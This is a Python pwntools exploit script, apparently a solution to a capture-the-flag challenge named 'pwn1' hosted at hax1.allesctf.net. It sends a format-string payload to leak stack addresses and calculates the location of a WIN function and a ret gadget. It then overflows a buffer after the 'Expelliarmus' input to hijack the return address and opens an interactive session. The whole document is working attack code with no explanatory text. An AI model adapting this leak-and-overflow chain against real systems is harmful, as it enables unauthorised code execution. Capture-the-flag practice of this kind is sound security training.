from pwn import *

#p = process("./pwn1/pwn1")
p = remote("hax1.allesctf.net", 9100)

format_string = "|".join(["%p" for _ in xrange(0, 42)])

p.recvuntil("Enter your witch name:")
print("recived first question, send line")
p.sendline(format_string)

format_result = p.recvuntil("enter your magic spell")
stack = format_result.split("|")

main_addr = int(stack[-4], 16) # get the addres of main from the leaked values
win_addr = main_addr - 0x135 # calculate the offset to the WIN function
return_to_exp = win_addr + 0x36; # calculate the offset to a "ret" gadget

filler = "A"*251

print "return_to_exp: " + str(hex(return_to_exp))
print "win_addr: " + str(hex(win_addr))
#raw_input("WAIT")
p.sendline("Expelliarmus\x00" + filler + p64(return_to_exp) + p64(win_addr))

#print stack

p.interactive()
